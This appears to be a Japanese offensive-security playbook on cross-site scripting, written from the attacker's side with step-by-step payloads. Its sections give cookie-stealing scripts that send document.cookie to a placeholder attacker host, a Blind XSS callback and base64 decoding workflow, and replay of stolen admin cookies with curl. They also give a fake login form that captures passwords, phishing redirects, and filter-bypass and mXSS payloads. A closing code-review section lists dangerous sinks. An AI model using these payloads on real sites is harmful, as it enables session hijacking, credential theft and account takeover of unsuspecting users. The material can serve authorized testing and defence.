# クロスサイトスクリプティング（XSS）

> **スコープ**: Web アプリへの JavaScript 注入。基本動作確認〜ヘッダー経由注入〜Cookie スティーリング〜Blind XSS callback〜Cookie 植え替え〜DOM 偽装〜バイパスエンコード〜mXSS / prototype pollution / コードレビュー観点まで扱う。XSS で取得した管理者セッションを使った後続攻撃は `Command_Injection.md`（管理者専用 API のインジェクション）を参照。

## 着火条件

- コメント欄・検索バー・プロフィール入力などユーザー入力が HTML としてページに反映される箇所がある
- 入力値がエスケープ処理されずそのままページに埋め込まれる
- URL パラメータや HTTP レスポンスヘッダーに入力値が反射される

## 環境前提

- 実行環境: テスター端末（ペイロード作成）/ 被害者ブラウザ（ペイロード実行）
- 必要なツール: `python3 -m http.server`（OOB コールバック受信）/ ブラウザ DevTools / Burp Suite（ヘッダー注入・Cookie 植え替え）/ `interactsh`（Blind XSS 用 OAST。Burp Collaborator 無料代替）

## 先に確認すること

- **Cookie スティーリングは HTTPOnly 属性の確認が前提**: DevTools → Application → Cookies で HTTPOnly 列を確認する

| HTTPOnly の状態 | 次のアクション |
|---------------|-------------|
| **付いている** | `document.cookie` での取得は不可 → DOM 偽装（§6）/ フィッシングリダイレクト / CSRF 補助に切り替える |
| **付いていない** | Cookie スティーリングが有効 → §3 へ |

- **本文がフィルタされたらリクエストヘッダーが反射されていないか確認する**: `<script>alert(1)</script>` を本文に入れてエラーページが返ってきた場合、**そのエラーページ自身が攻撃面になっていることが多い**。画面にリクエストヘッダー（User-Agent / Referer / Cookie）がそのまま反射される設計なら §2 のヘッダー注入へ

**XSS のタイプ:**

| タイプ | 条件 | 着眼点 |
|------|------|--------|
| 反射型（Reflected）| 入力値がそのままレスポンスに反射される | URL パラメータ・検索結果・エラーメッセージ |
| 格納型（Stored）| 入力値がサーバーに保存され他ユーザーに表示される | コメント欄・メッセージ機能・プロフィール |
| DOM 型（DOM-based）| クライアントサイド JS が URL フラグメントを直接 DOM に書き込む | `document.write()` / `innerHTML` の使用箇所 |
| **mXSS（Mutation XSS）**| サニタイズ後の文字列が `innerHTML` 代入時に mutate する | DOMPurify + `innerHTML` の組み合わせ（§8）|
| **Blind XSS**| 入力値はその場では反射されないが後で別ユーザーのブラウザで読まれる | お問い合わせフォーム・サポートチケット・管理者向けレポート画面 |

**Blind XSS の発火シグナル:**

| 観測される文言・挙動 | 意味 | 次のアクション |
|---|---|---|
| 「メッセージを管理者に送信しました」| 管理者のブラウザで開かれる可能性 | §4 Blind XSS ペイロード送信 |
| 「不正な入力を検出しました。管理者に通知しました」| 管理者用レポート画面に reflect される設計 | 同上。本文だけでなくヘッダーも注入（§2）|
| 問い合わせ・苦情・サポート機能 | 管理者ブラウザで HTML 化されて表示される可能性 | 同上 |

**攻撃者の思考トレース:** まず「何が反射されているか」を把握する。本文フォームが弾かれても、ヘッダー値（User-Agent / Referer）が反射されるエラーページに別の攻撃面がある。管理者が閲覧するページには Blind XSS ペイロードを格納する価値が高い。

---

## 1. 基本的な動作確認

**コマンド（ペイロード）:**

```html
<!-- [Attacker] HTML タグが解釈されるか確認 -->
<b>test</b>

<!-- [Attacker] JavaScript が実行されるか確認 -->
<script>alert(1)</script>

<!-- [Attacker] script タグがフィルタされる場合：イベントハンドラ経由 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `<b>test</b>` で太字が表示される | HTML として解釈されている | `<script>alert(1)</script>` / イベントハンドラへ |
| `alert(1)` が発火する | XSS 成立 | §3 Cookie スティーリング / §4 Blind XSS / §6 DOM 偽装へ |
| `<script>` が除去されるがタグが表示される | フィルタが特定タグのみブロック | `<img onerror=...>` / `<svg onload=...>` へ |
| エラーページにリクエストヘッダーが反射 | フォームフィルタ + ヘッダー非サニタイズ | §2 ヘッダー注入へ |

**注意:** `<b>test</b>` を入力してページ上で太字になる → HTML として解釈されている。`<script>` タグが除去されていてもイベントハンドラが通るケースが多い。

---

## 2. リクエストヘッダー経由の注入

WAF / アプリ側のフィルタが**フォームのフィールド名にしかかかっていない**ケースが多い。エラーページにリクエストヘッダーが反射されているのを観測したら、ヘッダー側に `<script>` を入れて再送する。ローカルプロキシ（Burp Suite / mitmproxy）でリクエストを傍受し差し替えて forward する。

**コマンド（Burp Repeater でのヘッダー操作例）:**

```http
POST /[ENDPOINT] HTTP/1.1
Host: [TARGET]
User-Agent: <script>alert(1)</script>
```

**狙うヘッダーの優先順:**
1. `User-Agent`（最も反射されやすい）
2. `Referer`
3. `X-Forwarded-For` / `X-Real-IP`（LB / WAF がログに残す設計でよく反射）
4. `Cookie`（自分の Cookie 値に注入。フィルタ回避テストに有効）

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| ヘッダー注入で `alert(1)` が発火 | フォームフィルタを迂回。ヘッダー注入で XSS 成立 | §3 Cookie スティーリングへ |
| ヘッダー値が画面に表示されるが JS は実行されない | サニタイズが一部のみ（HTML は出るが script ブロック）| イベントハンドラ（`onerror` / `onload`）を試す |
| 「report has been sent to the administrator」 | 管理者がレポートを後から閲覧する設計 | Blind XSS に切り替え（§4）。ヘッダー + 本文の両方に注入 |

---

## 3. Cookie スティーリング

**事前準備（必須）:** テスター端末で受信用 HTTP サーバーを起動する。

```bash
# [Attacker] 受信用リスナー（443/80 は Egress を通りやすい）
python3 -m http.server 8000
# [Attacker] 自分の到達可能 IP を確認
ip a | grep "inet " | grep -v 127.0.0.1
```

**コマンド（ペイロード）:**

```html
<!-- [Attacker] document.location 経由（被害者が画面遷移するため気付かれやすい） -->
<script>document.location='http://[ATTACKER_HOST]/?c='+document.cookie</script>

<!-- [Attacker] img タグ経由（script タグ禁止の場合） -->
<img src=x onerror="fetch('http://[ATTACKER_HOST]/?c='+document.cookie)">

<!-- [Attacker] new Image() ステルスチャネル（画面遷移なし・Blind XSS で推奨） -->
<script>var i=new Image(); i.src="http://[ATTACKER_HOST]/?c="+btoa(document.cookie);</script>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| テスター側 HTTP サーバーに Cookie が届く | Cookie スティーリング成立 | §5 Cookie 植え替えへ |
| callback が来ない | ペイロードが実行されていない / CSP で外部接続遮断 | `<img onerror=...>` に切替・受信ポートを 80/443 に変更 |
| callback は来たが Cookie 値が空 | HTTPOnly 付き | §6 DOM 偽装・フィッシングリダイレクトへ切替 |

**注意:** `new Image()` を使う理由（Blind XSS の文脈で重要）: 画面遷移しない / `btoa()` で base64 化することで Cookie に含まれる `=` `;` 等の特殊文字をそのまま送れる。**自分のセッションが先に届く**（投稿時に自分が一度ロード → 1 件目は捨てて 2 件目以降の Cookie を狙う）。

---

## 4. Blind XSS の callback 受信と Cookie の復号

**コマンド（ペイロード例）:**

```html
<!-- [Attacker] Blind XSS ペイロード（管理者ブラウザで実行させる） -->
<script>var i=new Image(); i.src="http://[ATTACKER_HOST]:8000/?c="+btoa(document.cookie);</script>
```

callback 受信例（base64 化した場合）:

```
[ATTACKER_IP] - - [DATE] "GET /?c=aXNfYWRtaW49Im[...]= HTTP/1.1" 200 -
```

**コマンド（受信後の復号）:**

```bash
# [Attacker] base64 -d で平文に戻す
echo "aXNfYWRtaW49Im[...]=" | base64 -d
# 例: is_admin=ImFkbWluIg.[SIGNATURE]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| callback の UA が自分のブラウザと違う | 別ユーザー（管理者）のブラウザでロードされた | §5 Cookie 植え替えへ |
| 受信元 IP が自分以外 | 別ユーザーの確認 | 同上 |
| callback が一切来ない | ペイロードが管理者ブラウザに届く経路にない / CSP 遮断 / フィルタ | `<img onerror=...>` に切替・期間を空けて待つ・受信 IP/Port を 80/443 に変更 |

**注意:** Blind XSS は管理者の閲覧タイミング依存なので、複数ペイロードを送る前に十分待つ（数分〜数十分）。受信用ポートは 80/443 に寄せると Egress を通りやすい。

---

## 5. 取得した Cookie で別ユーザーになりすます

**手順（ブラウザで植え替える）:**

```
1. ブラウザ右クリック → Inspect Element
2. Application → Storage → Cookies（Chromium 系）/ Storage（Firefox）タブを開く
3. 対象ドメインを選び、Cookie 名の Value をダブルクリック
4. 取得した Cookie 値を貼り付けて Enter
5. 該当ページをリロード → 別ユーザー（管理者）として表示される
```

**コマンド（curl で差し替える）:**

```bash
# [Attacker] Cookie ヘッダーを直接指定してアクセス
curl -s http://[TARGET]/dashboard -H "Cookie: [COOKIE_NAME]=[STOLEN_COOKIE_VALUE]"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 管理者用ダッシュボードが表示される | 管理者セッション植え替え成功 | 管理者機能の探索 → `Command_Injection.md`（管理者 API のインジェクション）|
| ログイン画面に戻る | `path` / `Secure` / `SameSite` 属性不一致 or Bearer / CSRF トークンが必要 | DevTools で Cookie 全属性を一致させる / 必要なヘッダーも合わせて差し替える |
| 管理者ページが 403 | Cookie だけでなくセッション内部の権限フラグが別管理 | パラメータ改ざん（IDOR / BFLA）に切り替える |

**注意:** `path` / `domain` / `Secure` / `SameSite` 属性が元 Cookie と一致していないと送信されない。元の値をそのまま上書きする運用が安全。**stolen Cookie はセッションが切れるまで**（管理者がログアウトすると無効化）。取得したらすぐに必要な操作を済ませる。

---

## 6. DOM 偽装・フィッシングリダイレクト

**コマンド（ペイロード）:**

```html
<!-- [Attacker] 偽ログインフォームを挿入して DOM を書き換える -->
<script>
document.body.innerHTML='<form action="http://[ATTACKER_HOST]/capture">Username:<input name="u"><br>Password:<input type="password" name="p"><input type="submit"></form>';
</script>

<!-- [Attacker] 別のフィッシングサイトへ自動転送 -->
<script>window.location='http://[PHISHING_SITE]'</script>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 偽フォームが表示される / 被害者がリダイレクトされる | DOM 偽装 / フィッシング成立 | 被害者が入力した認証情報を `[ATTACKER_HOST]/capture` のログで回収 |

**注意:** DOM 偽装は HTTPOnly 環境（Cookie 窃取不可）での代替として有効。CSP が `frame-src` を制限していると iframe 経由のフィッシングは防がれる。

---

## 7. 入力バイパス（エンコーディング・難読化）

**フィルタ回避チートシート:**

| フィルタの種類 | 回避手法 |
|------------|---------|
| `<script>` をブロック | イベントハンドラ（`onerror` / `onload` / `onclick`）を使う |
| `alert` をブロック | `confirm(1)` / `prompt(1)` で代替確認 |
| 引用符をエスケープ | HTML エンコーディング（`&quot;` / `&#34;`）/ URL エンコーディング（`%22`）|
| キーワード一致フィルタ | 大文字小文字混在（`<sCrIpT>`）/ ダブルエンコーディング（`%253C`）|
| `javascript:` をブロック | `data:text/html` スキーマに切り替える |

**コマンド（バイパスペイロード例）:**

```html
<!-- [Attacker] HTML エンコーディング -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- [Attacker] ダブルエンコーディング（サーバーとブラウザで 2 回デコードされる経路に有効） -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E

<!-- [Attacker] タグ大文字混在 -->
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT>alert(1)</sCrIpT>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| バイパスで `alert(1)` が発火 | フィルタ回避成立 | §3 Cookie スティーリングへ |
| 全バイパスが失敗 | 堅牢なサニタイズ | §8 mXSS / prototype pollution を検討 |

---

## 8. mXSS / prototype pollution / コードレビュー観点（上級）

### mXSS（Mutation XSS）

サニタイズ後の文字列が `innerHTML` 代入時に mutate して XSS になる。DOMPurify + `innerHTML` の組み合わせで発生する。

**確認手順:**

1. 対象がサニタイズライブラリ（DOMPurify 等）を使っているか確認（JS バンドルを grep）
2. サニタイズ後の文字列が `innerHTML` / `outerHTML` / `document.write()` 経由で DOM に注入されているか確認（`textContent` はパースされないので安全）
3. 上記 2 が揃ったら mutation 系ペイロードを順に試す

```html
<!-- [Attacker] Cure53 の mXSS PoC（一例）-->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

4. `DOMPurify.version` で version 確認 → 当該 version の既知 mXSS bypass が公開されているか確認

### prototype pollution

`__proto__` / `constructor.prototype` 経由でグローバルオブジェクトプロトタイプを汚染し、後段で XSS sink にたどり着く経路。jQuery `$.extend(true, ...)` / lodash `_.merge` の古いバージョンが汚染源として典型。

```js
// [Attacker] 例: ?__proto__[srcdoc]=<img src=x onerror=alert(1)> 等のクエリで Object.prototype を汚染
// 後段で iframe を生成する処理が srcdoc をプロトタイプ汚染値から読むと XSS 発火
```

### コードレビュー観点（フレームワーク固有の XSS sink）

ソースコードにアクセスできる場合は以下のパターンを grep する。

| コード | 安全か | 理由 |
|------|--------|------|
| `element.innerHTML = userInput` | ❌ 危険 | HTML として解釈される |
| `$(elem).html(userInput)` | ❌ 危険 | jQuery `.html()` = `innerHTML` と同義 |
| `element.textContent = userInput` | ✅ 安全 | テキストとして扱われる |
| `$(elem).text(userInput)` | ✅ 安全 | jQuery `.text()` = `textContent` と同義 |
| React `dangerouslySetInnerHTML={{__html: userInput}}` | ❌ 危険 | 意図的に HTML 注入 |

```bash
# [Attacker] 危険な sink を grep で一括探索
grep -rn "\.html(" src/ --include="*.ts" --include="*.js"
grep -rn "innerHTML\s*=" src/ --include="*.ts" --include="*.js"
grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" --include="*.jsx"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `.html(` / `innerHTML =` がヒット | XSS sink 候補 | 流れ込む値がユーザー制御可能かコードを遡る |
| mXSS PoC で alert が発火 | DOMPurify バイパス成立 | §3 Cookie スティーリングへ |

> 原理と各フレームワークの詳細 → `../../06_Concepts/Electron_Security.md`（Electron の場合の RCE への昇格条件も記載）

---

## 刺さらなかったとき（全体）

| 観測される症状 | 推定原因 | 代替手段 |
|---|---|---|
| 本文 `<script>` が弾かれる | フォーム入力にフィルタ | リクエストヘッダー（User-Agent / Referer）に注入を移す（§2）|
| ヘッダー注入も反射されない | ヘッダー値もサニタイズ済み | Stored / Blind XSS が使えるエンドポイントを探す（§4）|
| Blind XSS の callback が一切来ない | 管理者画面に届いていない / CSP で外部接続遮断 | `<img onerror=...>` に切替・受信 IP/Port を 80/443 に変更・期間を空けて待つ |
| callback は来たが Cookie 値が空 | HTTPOnly が付いている | DOM 偽装（§6）/ フィッシングリダイレクト / CSRF 補助に切替 |
| Cookie を植え替えてもログイン画面に戻る | 属性不一致 or 追加トークンが必要 | DevTools で Cookie 全属性を一致させる |
| 全バイパスが失敗 | 堅牢なサニタイズ | §8 mXSS / prototype pollution を検討 |

---

## 注意点・落とし穴

- **HTTPOnly Cookie が設定されていると `document.cookie` では取得できない**: DOM 偽装・フィッシング・CSRF を狙う
- **CSP が有効な場合**: `unsafe-inline` が許可されているかどうかを先に確認。`nonce-...` / `strict-dynamic` 構成では既存スクリプト後段からの実行経路が必要
- **Trusted Types**: `Content-Security-Policy: require-trusted-types-for 'script'` があると `innerHTML` 等の DOM XSS sink が TypeError でブロックされる（HTML / 反射型 / 格納型 XSS には効かない）
- **格納型 XSS は影響範囲が広い**: 管理者が閲覧するページに格納できれば高権限への昇格につながる
- **Blind XSS は callback が来るまで時間がかかる**: 複数ペイロードを送る前に十分待つ（数分〜数十分）
- **callback で 1 件目に届く Cookie は自分のもの**: 2 件目以降を見る

> **個別ブロック固有の注意は各 §N の「注意:」を参照。**

---

## 関連技術

- 前：ユーザー入力が HTML として反映される箇所を発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：レスポンス一次トリアージで HttpOnly 欠落を確認 → `../../01_Reconnaissance/Web_Response_Triage.md`
- 後：HTTPOnly 未設定の Cookie が取得できた → 管理者セッションで管理画面にアクセス → `../../01_Reconnaissance/Web_Enumeration.md`
- 後：管理画面で別の入力点を発見 → `Command_Injection.md`（管理者専用 API にコマンドインジェクション）
- 後：格納型 XSS で管理者セッション取得 → `../Credential_Discovery.md`
- 関連：SQLi（同じ入力フィールドの脆弱性）→ `SQLi.md`
- 関連：SSRF（入力値がサーバー側リクエストになる経路）→ `SSRF.md`
- 関連：Open Redirect との連鎖（`javascript:` スキーム経由 XSS 化）→ `Open_Redirect.md`
- 関連：LLM 出力経由の XSS（Improper Output Handling）→ `../../06_Concepts/AI_ML/Generative_AI/LLM_Attacks.md`
- 関連：攻撃側の準備（リスナー起動・到達可能 IP の確認）→ `../../06_Concepts/Reverse_Shell.md`
- 後：Electron デスクトップアプリで XSS が発火する環境 → RCE に到達する可能性 → `Electron_XSS_RCE.md`
- 関連：Electron の nodeIntegration / contextIsolation の原理 → `../../06_Concepts/Electron_Security.md`
